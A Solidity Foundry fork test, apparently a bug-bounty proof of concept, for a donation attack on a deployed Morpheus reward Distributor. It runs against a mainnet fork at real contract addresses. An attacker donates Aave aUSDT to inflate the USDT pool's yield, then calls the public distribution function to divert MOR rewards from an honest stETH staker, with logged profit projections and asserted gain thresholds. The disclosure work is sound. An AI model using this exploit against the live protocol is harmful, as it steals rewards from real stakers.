// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    // NOTE: no return values declared on transfer/approve. Tether USDT's
    // approve() returns NO data (non-standard ERC20); declaring a bool
    // return makes Solidity's ABI decoder revert on the empty returndata.
    // Declaring no return value is safe for both USDT and standard tokens.
    function transfer(address, uint256) external;
    function approve(address, uint256) external;
}

interface IDepositPoolMinimal {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function totalDepositedInPublicPools() external view returns (uint256);
}

interface IDistributorMinimal {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function distributedRewards(uint256, address) external view returns (uint256);
    function minRewardsDistributePeriod() external view returns (uint256);
    function chainLinkDataConsumer() external view returns (address);
    function getDistributedRewards(uint256, address) external view returns (uint256);
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IRewardPoolMinimal {
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_) external view returns (uint256);
}

interface IAavePoolMinimal {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IPriceConsumerMinimal {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IStETHMinimal {
    function submit(address referral) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
}

/// @notice DST-01 CORRECTED VERDICT test (Morpheus bug bounty, Leg 2C-corrected).
/// Coordinator-approved corrected design (see leg file
/// leg-2c-corrected-dst01-proof.md). The original design in
/// leg-2-deposit.md Sec 4.4 FAILED as written (DST01Fork.t.sol, kept
/// untouched as the record): its backward warp to gate-60 panics inside
/// Aave (getReserveNormalizedIncome underflows when block.timestamp is
/// before the reserve lastUpdateTimestamp), and at block 26397383 the
/// fork window held 3.33 days of stale yield, so D=300 was unprofitable
/// there. The coordinator re-ran the Leg 2C tests and reproduced the
/// failure exactly, then approved this corrected design:
///
///  - Fork block 26314439 (CAP-H1's block). Fork timestamp 1793470139
///    sits INSIDE the closed distribution window (lastCalc 1793443547,
///    gate opens 1793529947), so FORWARD-ONLY construction works:
///    setup + stake at fork time, NO warp-back, then warp FORWARD to
///    (lastCalc after staking) + 86401 and call distributeRewards(0).
///  - Donation D = 350 aUSDT (349,999,998 aUSDT as minted by the real
///    Aave supply in DIAG 3). D=300 does NOT clear the 700-MOR pool
///    threshold at this block (DIAG 2: 634.92 MOR); D=350 does
///    (DIAG 3: 714.09 MOR).
///  - Honest witness = fresh stETH staker (1,000 stETH via Lido submit,
///    CAP-H1 pattern), NOT a USDT staker (a USDT staker benefits from
///    the attack). Attacker = fresh unprivileged address.
///  - Control-vs-attack: two fresh forks of block 26314439, identical
///    except the donation. No privileged accounts anywhere; price mocks
///    only via the CAP-H1 pattern (oracle reads pinned to fork-block
///    values, no protocol logic mocked).
///
/// Assertions (all three must pass; thresholds UNCHANGED from the
/// original design -- 400 / strictly-less / 700 MOR):
///   (1) attacker gain >= 400 MOR
///   (2) honest staker pending MOR strictly LOWER in attack than control
///   (3) pool diverted (USDT pool delta attack minus control) >= 700 MOR
/// All values are logged in MOR wei + MOR + USD at $0.79/MOR (thin-
/// liquidity caveat: DexScreener Uniswap pair liquidity $9,046.96).
///
/// This test is the CORRECTED verdict run. It does NOT by itself label
/// DST-01 VALIDATED: that label requires the coordinator's personal
/// re-run of this passing test, which has not happened. Report only
/// "PoC PASSES (corrected design)" or "PoC FAILS" with the diagnosis.
contract DST01VerdictCorrectedTest is Test {
    uint256 constant FORK_BLOCK = 26314439; // CAP-H1's block; gate closed at fork
    string constant RPC_URL = "https://eth.drpc.org"; // publicnode 403s archive calls

    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant REWARD_POOL = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    // Fresh unprivileged attacker (anyone-controlled address).
    address constant ATTACKER = 0xA77AC00000000000000000000000000000000000;

    IDistributorMinimal dist = IDistributorMinimal(DIST);
    IDepositPoolMinimal usdtPool = IDepositPoolMinimal(USDT_POOL);
    IDepositPoolMinimal stethPool = IDepositPoolMinimal(STETH_POOL);
    IERC20Minimal usdt = IERC20Minimal(USDT);
    IERC20Minimal ausdt = IERC20Minimal(AUSDT);
    IAavePoolMinimal aavePool = IAavePoolMinimal(AAVE_POOL);
    IStETHMinimal steth = IStETHMinimal(STETH);

    address honest = makeAddr("dst01HonestStethStaker");

    struct RunResult {
        uint256 attackerPending; // MOR wei (1e18)
        uint256 honestPending; // MOR wei (1e18)
        uint256 usdtPoolDelta; // MOR wei distributed to USDT pool in the window
        uint256 stethPoolDelta; // MOR wei distributed to stETH pool in the window
        uint256 donation; // aUSDT donated (6 decimals), 0 in control
        uint256 tranche; // MOR wei released by the window's distributeRewards
    }

    function _capturePrices() internal returns (bytes32[] memory pathIds, uint256[] memory prices) {
        address consumer_ = dist.chainLinkDataConsumer();
        address[5] memory pools_ = [
            0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790, // stETH
            0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384, // WETH
            0xdE283F8309Fd1AA46c95d299f6B8310716277A42, // wBTC
            0x6cCE082851Add4c535352f596662521B4De4750E, // USDC
            0x3B51989212BEdaB926794D6bf8e9E991218cf116 // USDT
        ];
        pathIds = new bytes32[](5);
        prices = new uint256[](5);
        for (uint256 i = 0; i < pools_.length; i++) {
            (, string memory path_,,,,,, bool isExist_) = dist.depositPools(0, pools_[i]);
            require(isExist_, "pool must exist");
            bytes32 pid_ = IPriceConsumerMinimal(consumer_).getPathId(path_);
            uint256 px_ = IPriceConsumerMinimal(consumer_).getChainLinkDataFeedLatestAnswer(pid_);
            require(px_ > 0, "price capture failed");
            pathIds[i] = pid_;
            prices[i] = px_;
            console.log("captured price (raw 1e18, pool idx):", i);
            console.log("  price:", px_);
        }
    }

    function _pinPrices(bytes32[] memory pathIds, uint256[] memory prices) internal {
        address consumer_ = dist.chainLinkDataConsumer();
        for (uint256 i = 0; i < pathIds.length; i++) {
            vm.mockCall(
                consumer_,
                abi.encodeWithSelector(
                    IPriceConsumerMinimal.getChainLinkDataFeedLatestAnswer.selector, pathIds[i]
                ),
                abi.encode(prices[i])
            );
        }
    }

    /// @notice Forward-only scenario on the currently selected fork.
    /// Setup + stake happen at fork time (NO warp-back), then warp
    /// FORWARD to (lastCalc after staking) + 86401 and distribute.
    /// At 26314439 the gate is closed at fork time, so the stake
    /// triggers no distribution and the measured window is the window
    /// the design intended (lastCalc 1793443547 -> gate+1 1793529948).
    /// @param donate_ true = attack run (donate aUSDT before distributing).
    /// @param aaveSupply_ USDT (6 dec) the attacker supplies to Aave to
    ///   mint the donation; the FULL aUSDT balance is donated.
    function _runScenario(bool donate_, uint256 aaveSupply_) internal returns (RunResult memory res) {
        uint128 lastCalc_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 gate_ = uint256(lastCalc_) + dist.minRewardsDistributePeriod();
        console.log("lastCalc:", lastCalc_);
        console.log("fork ts:", block.timestamp);
        console.log("gate opens:", gate_);
        console.log("gap forkTs-lastCalc (s):", block.timestamp - uint256(lastCalc_));

        // Capture Chainlink prices at fork-block freshness, before any warp.
        (bytes32[] memory pathIds_, uint256[] memory prices_) = _capturePrices();

        // --- Attacker setup (at fork time, before any warp) ---
        // deal() funding is scaffolding; aaveSupply_ USDT -> real Aave
        // supply -> ~aaveSupply_ aUSDT. Attacker keeps 100,000 USDT for staking.
        deal(USDT, ATTACKER, 100_000e6 + aaveSupply_);
        vm.startPrank(ATTACKER);
        usdt.approve(AAVE_POOL, type(uint256).max);
        aavePool.supply(USDT, aaveSupply_, ATTACKER, 0);
        uint256 aBal_ = ausdt.balanceOf(ATTACKER);
        console.log("attacker aUSDT minted:", aBal_);
        usdt.approve(DIST, type(uint256).max);
        vm.stopPrank();

        // --- Honest stETH staker setup (at fork time) ---
        vm.deal(honest, 1_000 ether);
        vm.startPrank(honest);
        steth.submit{value: 1_000 ether}(address(0));
        uint256 stethBal_ = steth.balanceOf(honest);
        console.log("honest stETH:", stethBal_);
        steth.approve(DIST, type(uint256).max);
        steth.approve(STETH_POOL, type(uint256).max);
        vm.stopPrank();

        // --- Stake at fork time (NO warp-back) ---
        vm.prank(honest);
        stethPool.stake(0, stethBal_, 0, address(0));
        vm.prank(ATTACKER);
        usdtPool.stake(0, 100_000e6, 0, address(0));
        (,,,,,, uint256 virtAttacker_,,) = usdtPool.usersData(ATTACKER, 0);
        (,,,,,, uint256 virtHonest_,,) = stethPool.usersData(honest, 0);
        console.log("attacker virtualDeposited (USDT pool):", virtAttacker_);
        console.log("honest virtualDeposited (stETH pool):", virtHonest_);
        console.log("attacker pending before distribution:", usdtPool.getLatestUserReward(0, ATTACKER));
        console.log("honest pending before distribution:", stethPool.getLatestUserReward(0, honest));

        // --- Warp FORWARD to (lastCalc after staking) + 86401 (gate open) ---
        uint128 lastCalc2_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 gate2_ = uint256(lastCalc2_) + dist.minRewardsDistributePeriod();
        console.log("lastCalc after staking:", lastCalc2_);
        console.log("next gate opens:", gate2_);
        vm.warp(gate2_ + 1);
        _pinPrices(pathIds_, prices_);

        uint256 usdtBefore_ = dist.distributedRewards(0, USDT_POOL);
        uint256 stethBefore_ = dist.distributedRewards(0, STETH_POOL);
        uint256 tranche_ = IRewardPoolMinimal(REWARD_POOL).getPeriodRewards(
            0, lastCalc2_, uint128(gate2_ + 1)
        );
        console.log("tranche for this window (MOR wei):", tranche_);

        if (donate_) {
            vm.prank(ATTACKER);
            ausdt.transfer(DIST, aBal_);
            res.donation = aBal_;
            console.log("donated aUSDT to Distributor:", aBal_);
        }

        // Attacker triggers the distribution themselves (permissionless call).
        vm.prank(ATTACKER);
        dist.distributeRewards(0);

        res.attackerPending = usdtPool.getLatestUserReward(0, ATTACKER);
        res.honestPending = stethPool.getLatestUserReward(0, honest);
        res.usdtPoolDelta = dist.distributedRewards(0, USDT_POOL) - usdtBefore_;
        res.stethPoolDelta = dist.distributedRewards(0, STETH_POOL) - stethBefore_;
        res.tranche = tranche_;
        console.log("attackerPending:", res.attackerPending);
        console.log("honestPending:", res.honestPending);
        console.log("usdtPoolDelta:", res.usdtPoolDelta);
        console.log("stethPoolDelta:", res.stethPoolDelta);
    }

    /// @notice Log a MOR amount in wei, in MOR (3 decimals), and in USD
    /// at $0.79/MOR (dollars + cents). USD is a thin-liquidity estimate.
    function _logMor(string memory label, uint256 morWei) internal pure {
        uint256 morWhole_ = morWei / 1e18;
        uint256 morMillis_ = (morWei % 1e18) / 1e15;
        uint256 usdCents_ = (morWei * 79) / 1e18; // MOR * $0.79, in cents
        console.log(string.concat(label, " MOR wei:"), morWei);
        console.log(string.concat(label, " MOR whole:"), morWhole_);
        console.log(string.concat(label, " MOR millis (3dp):"), morMillis_);
        console.log(string.concat(label, " USD dollars @ $0.79:"), usdCents_ / 100);
        console.log(string.concat(label, " USD cents rem @ $0.79:"), usdCents_ % 100);
    }

    function test_DST01_VerdictCorrected_ForwardOnly_D350() public {
        uint256 forkControl_ = vm.createFork(RPC_URL, FORK_BLOCK);
        uint256 forkAttack_ = vm.createFork(RPC_URL, FORK_BLOCK);

        vm.selectFork(forkControl_);
        console.log("=== CORRECTED CONTROL RUN (26314439, no donation) ===");
        RunResult memory control_ = _runScenario(false, 350e6);

        vm.selectFork(forkAttack_);
        console.log("=== CORRECTED ATTACK RUN (26314439, 350 aUSDT donation) ===");
        RunResult memory attack_ = _runScenario(true, 350e6);

        console.log("=== CORRECTED COMPARISON (26314439, D=350) ===");
        console.log("attackerPending control:", control_.attackerPending);
        console.log("attackerPending attack:", attack_.attackerPending);
        uint256 attackerGain_ = attack_.attackerPending - control_.attackerPending;
        _logMor("attacker gain", attackerGain_);
        console.log("honestPending control:", control_.honestPending);
        console.log("honestPending attack:", attack_.honestPending);
        uint256 honestLoss_ = control_.honestPending - attack_.honestPending;
        _logMor("honest loss", honestLoss_);
        console.log("usdtPoolDelta control:", control_.usdtPoolDelta);
        console.log("usdtPoolDelta attack:", attack_.usdtPoolDelta);
        uint256 poolDiverted_ = attack_.usdtPoolDelta - control_.usdtPoolDelta;
        _logMor("pool diverted", poolDiverted_);
        console.log("stethPoolDelta control:", control_.stethPoolDelta);
        console.log("stethPoolDelta attack:", attack_.stethPoolDelta);
        uint256 stethLoss_ = control_.stethPoolDelta - attack_.stethPoolDelta;
        _logMor("stETH pool loss", stethLoss_);
        console.log("tranche control (MOR wei):", control_.tranche);
        console.log("tranche attack (MOR wei):", attack_.tranche);
        console.log("donation aUSDT:", attack_.donation);
        // Attacker net USD/day: gain value minus donation cost (~$1 per aUSDT).
        uint256 gainCents_ = (attackerGain_ * 79) / 1e18;
        uint256 donationCents_ = attack_.donation / 1e4; // aUSDT 6dec -> cents at $1
        console.log("attacker gain USD cents/day @ $0.79:", gainCents_);
        console.log("donation cost USD cents/day:", donationCents_);
        console.log("attacker net USD cents/day:", gainCents_ - donationCents_);
        console.log("attacker net USD dollars/day (int):", (gainCents_ - donationCents_) / 100);
        console.log("attacker net USD cents rem/day:", (gainCents_ - donationCents_) % 100);
        // 14-day claim-cycle projection (claimLockPeriodAfterClaim = 14 days).
        uint256 gain14Cents_ = gainCents_ * 14;
        uint256 net14Cents_ = (gainCents_ - donationCents_) * 14;
        console.log("14-day attacker gain USD cents:", gain14Cents_);
        console.log("14-day attacker net USD cents:", net14Cents_);
        console.log("14-day attacker gain MOR wei:", attackerGain_ * 14);
        console.log("14-day pool diverted MOR wei:", poolDiverted_ * 14);
        console.log("14-day honest loss MOR wei:", honestLoss_ * 14);

        // Loss assertions (MOR wei, 1e18). Thresholds UNCHANGED from the
        // original design: attacker gain >= 400 MOR, honest strictly
        // less, pool diversion >= 700 MOR. DIAG 3 measured 522.26 /
        // strictly-less / 714.09 MOR at this block and D.
        assertGe(attackerGain_, 400e18, "attacker gain < 400 MOR");
        assertLt(attack_.honestPending, control_.honestPending, "honest pending did not fall");
        assertGe(poolDiverted_, 700e18, "pool diversion < 700 MOR");
    }
}
